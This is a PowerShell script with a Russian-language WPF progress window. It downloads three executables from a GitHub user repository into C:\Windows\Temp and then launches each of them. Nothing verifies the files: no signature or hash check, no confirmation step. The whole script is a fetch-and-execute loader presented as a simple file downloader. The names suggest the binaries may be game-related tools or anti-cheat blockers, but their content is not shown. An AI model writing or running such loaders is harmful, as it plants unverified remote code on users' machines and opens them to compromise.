Add-Type -AssemblyName PresentationFramework

$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
)

[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        Title="Загрузка файлов" Height="200" Width="400"
        WindowStartupLocation="CenterScreen" ResizeMode="NoResize">
    <StackPanel Margin="20">
        <TextBlock Name="StatusText" Text="Подготовка..." FontSize="14" Margin="0,0,0,10"/>
        <ProgressBar Name="ProgressBar" Height="25" Minimum="0" Maximum="100" Margin="0,0,0,10"/>
        <TextBlock Name="PercentText" Text="0%" FontSize="12" HorizontalAlignment="Center"/>
    </StackPanel>
</Window>
"@

$reader = [System.Xml.XmlNodeReader]::new($xaml)
$window = [System.Windows.Markup.XamlReader]::Load($reader)

$statusText  = $window.FindName("StatusText")
$progressBar = $window.FindName("ProgressBar")
$percentText = $window.FindName("PercentText")

$window.Add_Loaded({
    $script = {
        foreach ($item in $downloads) {
            $name = Split-Path $item.Path -Leaf
            $window.Dispatcher.Invoke({ $statusText.Text = "Скачиваю: $name" })

            $webClient = New-Object System.Net.WebClient

            $webClient.add_DownloadProgressChanged({
                $pct = $_.ProgressPercentage
                $window.Dispatcher.Invoke({
                    $progressBar.Value = $pct
                    $percentText.Text  = "$pct%"
                })
            }.GetNewClosure())

            $task = $webClient.DownloadFileTaskAsync($item.URL, $item.Path)
            $task.Wait()
        }

        $window.Dispatcher.Invoke({
            $statusText.Text  = "Все файлы скачаны!"
            $progressBar.Value = 100
            $percentText.Text  = "100%"
        })

        Start-Sleep -Seconds 1
        $window.Dispatcher.Invoke({ $window.Close() })

        foreach ($item in $downloads) {
            Start-Process $item.Path
        }
    }

    $thread = [System.Threading.Thread]::new([System.Threading.ThreadStart]$script)
    $thread.IsBackground = $true
    $thread.Start()
})

$window.ShowDialog() | Out-Null
